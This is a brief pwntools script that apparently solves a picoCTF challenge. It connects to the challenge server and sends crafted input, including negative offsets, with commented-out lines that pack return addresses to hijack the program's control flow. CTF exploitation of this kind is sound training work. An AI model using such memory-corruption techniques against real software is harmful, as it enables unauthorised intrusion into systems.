#!/usr/bin/env python

from pwn import *

local = False
if local:
  p = process('./vuln')
else:
  p = remote("saturn.picoctf.net", 61231)

print(p.recv(1024))
p.send(b"ddddddddddd{r\n")
print(p.recv(1024))
# p.send(b'-16\n' + p32(0x080492fc) + b"\n")
# p.send(b'-16\n' + p32(0x0804928b) + b"\n")
p.send(b'-16 -310\n')
res = p.recvall()
print(res.decode())
p.close()